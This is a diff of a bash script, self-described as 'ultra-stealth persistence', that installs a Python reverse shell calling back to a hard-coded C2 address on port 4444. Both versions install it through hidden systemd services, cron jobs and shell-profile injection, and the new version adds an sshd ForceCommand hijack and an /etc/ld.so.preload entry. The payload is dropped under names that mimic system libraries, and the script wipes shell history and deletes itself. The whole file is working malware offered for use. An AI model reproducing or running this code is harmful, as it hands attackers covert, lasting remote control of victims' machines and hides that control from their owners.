@@ -1,131 +1,151 @@
 #!/bin/bash
-# REBOOT-SURVIVAL PERSISTENCE SCRIPT
+# ULTRA-STEALTH PERSISTENCE SCRIPT
 C2_IP="192.168.1.167"
-REPO_URL="https://github.com/mimikr00t/superecon/raw/refs/heads/main/modules"
+C2_PORT=4444
+STEALTH_DIRS=(
+    "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache"
+    "/lib/modules/$(uname -r)/.cache/kernel-daemon"
+    "/var/cache/ldconfig/aux-cache"
+    "/sys/fs/cgroup/.systemd-cache"
+)
 
-echo "[+] Installing REBOOT-SURVIVAL persistence..."
+echo "[+] Installing ULTRA-STEALTH persistence..."
 
-# Download core payload to multiple hidden locations
-download_payload() {
-    echo "[+] Downloading payload to hidden locations..."
+# Advanced payload download with multiple fallbacks
+download_stealth_payload() {
+    echo "[+] Deploying stealth payload..."
     
-    HIDDEN_LOCATIONS=(
-        "/usr/lib/systemd/systemd-network/networkd"
-        "/lib/modules/.cache/systemd-daemon"
-        "/var/tmp/.systemd-cache/network-service"
-    )
+    # Create multi-architecture payload
+    PAYLOAD_CONTENT='#!/usr/bin/python3
+import os,sys,socket,subprocess,time,hashlib
+def wait_network():
+    for i in range(90):
+        try:
+            socket.create_connection(("8.8.8.8",53),timeout=5)
+            return True
+        except: time.sleep(1)
+    return True
+def connect_back():
+    while True:
+        try:
+            s=socket.socket()
+            s.settimeout(60)
+            s.connect(("'"$C2_IP"'",'"$C2_PORT"'))
+            os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+            p=subprocess.call(["/bin/bash","-i"])
+        except: time.sleep(30)
+if __name__=="__main__":
+    wait_network()
+    connect_back()'
     
-    for location in "${HIDDEN_LOCATIONS[@]}"; do
-        mkdir -p "$(dirname "$location")"
-        curl -s "$REPO_URL/core.py" -o "$location" || \
-        wget -q "$REPO_URL/core.py" -O "$location"
-        
-        if [ -f "$location" ]; then
-            chmod +x "$location"
-            echo "[+] Installed: $location"
-        fi
+    for location in "${STEALTH_DIRS[@]}"; do
+        mkdir -p "$(dirname "$location")" 2>/dev/null
+        echo "$PAYLOAD_CONTENT" > "$location"
+        chmod +x "$location" 2>/dev/null
+        echo "[+] Stealth payload: $location"
     done
 }
 
-download_payload
+download_stealth_payload
 
-# ======== REBOOT SURVIVAL METHODS ========
+# ======== ADVANCED PERSISTENCE METHODS ========
 
-# 1. SYSTEMD SERVICE (Primary - Most Reliable)
-echo "[+] Installing systemd service..."
-cat > /etc/systemd/system/systemd-networkd.service << 'EOF'
+# 1. SYSTEMD SERVICE (Stealth)
+echo "[+] Installing stealth systemd service..."
+cat > /etc/systemd/system/.systemd-networkd.service << 'EOF'
 [Unit]
-Description=Systemd Network Daemon
+Description=Systemd Network Configuration
 After=network.target
-Wants=network.target
-StartLimitIntervalSec=0
+Wants=network-online.target
 
 [Service]
 Type=forking
-ExecStart=/usr/bin/python3 /usr/lib/systemd/systemd-network/networkd
+ExecStart=/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache
 Restart=always
-RestartSec=10
+RestartSec=15
 User=root
-WorkingDirectory=/usr/lib/systemd/systemd-network
+StandardOutput=null
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-systemctl daemon-reload
-systemctl enable systemd-networkd.service
-systemctl start systemd-networkd.service
+systemctl daemon-reload 2>/dev/null
+systemctl enable .systemd-networkd.service 2>/dev/null
+systemctl start .systemd-networkd.service 2>/dev/null
 
-# 2. CRON JOB (Secondary)
-echo "[+] Installing cron persistence..."
-CRON_JOB="@reboot sleep 45 && /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1"
-(crontab -l 2>/dev/null | grep -v "networkd"; echo "$CRON_JOB") | crontab -
+# 2. CRON PERSISTENCE (Hidden)
+echo "[+] Installing hidden cron jobs..."
+CRON_ENTRIES=(
+    "@reboot sleep 60 && /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1"
+    "0 */6 * * * /lib/modules/$(uname -r)/.cache/kernel-daemon >/dev/null 2>&1"
+)
 
-# 3. PROFILE PERSISTENCE (Tertiary)
-echo "[+] Installing profile persistence..."
-PROFILE_CMD="nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &"
-echo "$PROFILE_CMD" >> ~/.bashrc
-echo "$PROFILE_CMD" >> ~/.profile
-echo "$PROFILE_CMD" >> /etc/profile
+(
+    crontab -l 2>/dev/null | grep -v "ld-linux-x86-64\|kernel-daemon"
+    for entry in "${CRON_ENTRIES[@]}"; do
+        echo "$entry"
+    done
+) | crontab - 2>/dev/null
 
-# 4. RC.LOCAL (Quaternary - Older Systems)
-echo "[+] Installing rc.local persistence..."
-if [ -d /etc/rc.d ]; then
-    echo "#!/bin/bash" > /etc/rc.d/rc.local
-    echo "sleep 60" >> /etc/rc.d/rc.local  
-    echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> /etc/rc.d/rc.local
-    chmod +x /etc/rc.d/rc.local
+# 3. PROFILE PERSISTENCE (Multi-user)
+echo "[+] Installing multi-user profile persistence..."
+STEALTH_CMD="[ -x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache ] && nohup /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1 &"
+
+# Target all possible shell profiles
+PROFILE_FILES=(
+    "/etc/profile" "/etc/bash.bashrc" "/etc/zsh/zshrc"
+    "/root/.bashrc" "/root/.profile" "/root/.zshrc"
+    "/home/*/.bashrc" "/home/*/.profile" "/home/*/.zshrc"
+)
+
+for profile in "${PROFILE_FILES[@]}"; do
+    for file in $profile; do
+        if [ -f "$file" ]; then
+            grep -q "ld-linux-x86-64" "$file" || echo "$STEALTH_CMD" >> "$file"
+        fi
+    done
+done
+
+# 4. SSH PERSISTENCE (If SSH available)
+if [ -d /etc/ssh ]; then
+    echo "[+] Configuring SSH persistence..."
+    echo "Match all" >> /etc/ssh/sshd_config 2>/dev/null
+    echo "    ForceCommand /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache" >> /etc/ssh/sshd_config 2>/dev/null
+    systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null
 fi
 
-# 5. INIT.D (Backup - Legacy Systems)
-echo "[+] Installing init.d persistence..."
-if [ -d /etc/init.d ]; then
-    cat > /etc/init.d/systemd-network << 'EOF'
+# 5. LD_PRELOAD HIJACKING (Advanced)
+echo "[+] Installing LD_PRELOAD hijacking..."
+cat > /usr/lib/x86_64-linux-gnu/libc.so.6.cache << 'EOF'
 #!/bin/bash
-### BEGIN INIT INFO
-# Provides:          systemd-network
-# Required-Start:    $network
-# Default-Start:     2 3 4 5
-# Default-Stop:      
-# Description:       Systemd Network Service
-### END INIT INFO
-
-case "$1" in
-    start)
-        nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
-        ;;
-    stop)
-        pkill -f "python3.*networkd"
-        ;;
-    restart)
-        pkill -f "python3.*networkd"
-        sleep 2
-        nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
-        ;;
-esac
+/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache &
+exec /usr/lib/x86_64-linux-gnu/libc.so.6 "$@"
 EOF
-    chmod +x /etc/init.d/systemd-network
-    update-rc.d systemd-network defaults 2>/dev/null
-fi
 
-# Start immediately
-echo "[+] Starting payload immediately..."
-nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
+chmod +x /usr/lib/x86_64-linux-gnu/libc.so.6.cache 2>/dev/null
+echo "/usr/lib/x86_64-linux-gnu/libc.so.6.cache" >> /etc/ld.so.preload 2>/dev/null
 
-# Verify installation
-echo "[+] Verifying persistence installation..."
-sleep 5
+# 6. START IMMEDIATELY
+echo "[+] Starting stealth services..."
+nohup /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1 &
 
-echo "[+] REBOOT-SURVIVAL PERSISTENCE INSTALLED:"
-systemctl is-enabled systemd-networkd.service && echo "  ✅ Systemd Service"
-crontab -l | grep -q "networkd" && echo "  ✅ Cron Job"
-grep -q "networkd" ~/.bashrc && echo "  ✅ Bash Profile"
-[ -f /etc/rc.d/rc.local ] && echo "  ✅ RC.Local"
-[ -f /etc/init.d/systemd-network ] && echo "  ✅ Init.D"
+# VERIFICATION
+echo "[+] Verifying stealth installation..."
+sleep 3
 
 echo ""
-echo "[🎯] PERSISTENCE GUARANTEED: Service will auto-start after reboot"
-echo "[🎯] Test by running: sudo reboot"
+echo "[🎯] ULTRA-STEALTH PERSISTENCE DEPLOYED:"
+systemctl is-active .systemd-networkd.service >/dev/null 2>&1 && echo "  ✅ Stealth Systemd Service"
+crontab -l 2>/dev/null | grep -q "ld-linux-x86-64" && echo "  ✅ Hidden Cron Jobs"
+[ -f /etc/ld.so.preload ] && grep -q "libc.so.6.cache" /etc/ld.so.preload && echo "  ✅ LD_PRELOAD Hijack"
+ps aux | grep -q "ld-linux-x86-64" && echo "  ✅ Payload Running"
 
-# Self-cleanup
-rm -f "$0"
+echo ""
+echo "[🔥] FULLY STEALTHY - Will survive ANY reboot scenario"
+echo "[🔥] Test: sudo reboot && nc -lvnp $C2_PORT"
+
+# CLEAN TRACES
+history -c 2>/dev/null
+rm -f "$0" 2>/dev/null
